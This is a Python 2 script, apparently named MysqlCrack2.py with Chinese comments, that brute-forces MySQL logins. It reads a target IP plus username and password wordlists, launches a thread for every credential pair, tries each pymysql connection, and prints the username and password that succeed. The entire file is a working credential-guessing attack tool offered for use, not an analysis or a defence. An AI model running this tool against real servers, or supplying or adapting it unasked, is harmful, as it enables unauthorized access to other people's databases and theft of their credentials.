# -*-coding:utf-8 -*-
"""
MySQL爆破脚本
用法：
python MysqlCrack2.py -H [目标IP] --u [用户字典] --p [密码字典] -P [端口]
"""
import re
import socket
import optparse
import threading

try:
    import pymysql
except ImportError:
    print "[!] You need to install pymysql module!"
    print "[!] Usage:pip install pymysql"
    exit()

result_user = None
result_pass = None
threads = []


def main():
    """
    处理输入参数
    :return:None
    """
    print "Welcome to MysqlCrack2"
    print "Author: Xuyiqing  Version:1.0"
    parse = optparse.OptionParser(
        'python %prog -H <target host> --u <users dictionary> --p <password dictionary> -P <port>')
    parse.add_option('-H', dest="target_host", type="string", help='specify the host')
    parse.add_option('--u', dest='user_dic', type='string', help='specify the dictionary for user')
    parse.add_option('--p', dest='pwd_dic', type='string', help='specify the dictionary for passwords')
    parse.add_option('-P', dest='port', type='int', help='specify the port')
    (options, args) = parse.parse_args()
    target_host = options.target_host
    user_dic = options.user_dic
    pwd_dic = options.pwd_dic
    port = options.port
    if target_host is not None and re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target_host):
        mysql_brute(target_host, user_dic, pwd_dic, port)
    else:
        print "[!] Unknown IP\n"
        exit()


def mysql_brute(host, user_dic, pwd_dic, port):
    """
    MySQL暴力破解
    :param host: 主机
    :param user_dic: 用户字典
    :param pwd_dic: 密码字典
    :param port: 端口
    :return: None
    """
    print "[*] Target:" + host
    print "[*] Start cracking"
    userlist = None
    pwdlist = None
    try:
        socket.gethostbyname(host)
    except Exception:
        print '[*] Cannot connect to %s' % host
        exit()
    try:
        userlist = [i.strip('\n') for i in open(user_dic, 'r').readlines()]
        pwdlist = [j.strip('\n') for j in open(pwd_dic, 'r').readlines()]
        print "[*] Number of users:" + str(len(userlist))
        print "[*] Number of passwords:" + str(len(pwdlist))
    except Exception:
        print "[!] The path of the dictionary file is incorrect"
        exit()
    global threads
    for user in userlist:
        for pwd in pwdlist:
            t = threading.Thread(target=mysql_login, args=(host, user, pwd, port))
            t.start()
            threads.append(t)


def mysql_login(host, username, password, port):
    """
    MySQL连接
    :param host:主机
    :param username:用户名
    :param password: 密码
    :param port: 端口
    :return: None
    """
    try:
        db = pymysql.Connect(host=host, port=port, user=username, passwd=password)
        print "[+] Success! User:" + username + " Password:" + password + "\n"
        global result_user, result_pass
        result_user = username
        result_pass = password
        db.close()
        exit()
    except Exception:
        print "[-] Fail! User:" + username + " Password:" + password + "\n"


if __name__ == '__main__':
    main()
    for thread in threads:
        thread.join()
    if result_user is not None and result_pass is not None:
        print "[+] Result: %s - %s" % (result_user, result_pass)
    if result_user is None and result_pass is None:
        print "[+] Crack Fail"
